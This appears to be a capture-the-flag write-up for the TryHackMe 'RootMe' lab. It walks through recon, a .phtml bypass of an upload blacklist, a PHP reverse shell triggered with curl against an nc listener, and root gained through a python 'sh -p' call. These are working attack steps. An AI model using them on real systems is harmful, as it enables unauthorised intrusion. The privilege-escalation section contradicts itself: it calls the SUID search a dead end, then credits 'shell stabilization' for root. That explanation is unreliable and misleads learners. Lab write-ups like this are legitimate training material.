# TryHackMe  RootMe

Easy-difficulty box. Blacklist-based file upload filter bypass (`.phtml`) → PHP reverse shell → shell stabilization → root.

**Target:** `10.48.177.25`
**User flag:** `THM{y0u_g0t_a_sh3ll}`
**Root flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Recon

```bash
nmap -sSCV 10.48.177.25 -oA nmap_scan_rootme.*
```

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.13) |
| 80   | http    | Apache 2.4.41 (Ubuntu)  `PHPSESSID` cookie, PHP backend confirmed |

<img width="864" height="422" alt="image" src="images/06-nmap.png" />

Only port 80 useful. Moved to enumeration.

---

## Content Discovery

```bash
gobuster dir -u http://10.48.177.25/ -w /usr/share/wordlists/dirb/common.txt -t 20
```

```
/panel/    (Status: 301) --> upload form, no auth
/uploads/  (Status: 301) --> serves uploaded files directly
```

<img width="806" height="534" alt="image" src="images/05-gobuster.png" />
<img width="1919" height="776" alt="image" src="images/08-landing-page.png" />

`/panel/` + `/uploads/` together = classic file upload target.

---

## Filter Bypass

Fuzzed the upload filename extension with Burp Intruder against common PHP-executable extensions.

<img width="1919" height="713" alt="image" src="images/07-upload-panel.png" />
<img width="1918" height="781" alt="image" src="images/09-intruder-fuzz.png" />

```
php, PHP          -> blocked ("PHP não é permitido!")
php5, php7        -> 200, accepted
phtml, phar, pht  -> 200, accepted
```

Filter only blacklists the literal string `php`  case-insensitive but nothing else. `.phtml` still executes as PHP on this Apache config. Classic blacklist-vs-allowlist mistake.

---

## Foothold

Renamed a [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) to `rev.phtml`, uploaded via `/panel/`.

<img width="1430" height="679" alt="image" src="images/10-burp-request.png" />

```bash
nc -lvnp 4444
curl http://10.48.177.25/uploads/rev.phtml
```

Shell as `www-data`.

```bash
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

<img width="424" height="33" alt="image" src="images/02-find-usertxt.png" />
<img width="295" height="58" alt="image" src="images/03-cat-usertxt.png" />

```
THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation

```bash
find / -user root -perm -4000 2>/dev/null
```

<img width="554" height="166" alt="image" src="images/01-suid-binaries.png" />

Checked against [GTFOBins](https://gtfobins.github.io/)  all standard system binaries, nothing exploitable. Dead end.

Stabilized the shell instead:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

`-p` preserves effective UID/GID on the spawned shell. `/root` turned out to be readable once stabilized  permission misconfig, not a designed boundary.

```bash
cd /root
cat root.txt
```

<img width="716" height="189" alt="image" src="images/04-root-flag.png" />

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full scan |
| Enumeration | Gobuster  found `/panel/` + `/uploads/` |
| Filter bypass | Burp Intruder  blacklist only matches `.php`, misses `.phtml`/`.pht`/`.php5`/`.php7`/`.phar` |
| Foothold | Uploaded `.phtml` PHP reverse shell → `www-data` |
| Privesc | SUID enum (dead end) → shell stabilization (`sh -p`) → `/root` readable |

**Note:** No SUID binary needed here  the win was in the upload filter, not privesc. Root came from stabilizing the shell properly and finding `/root` already misconfigured.
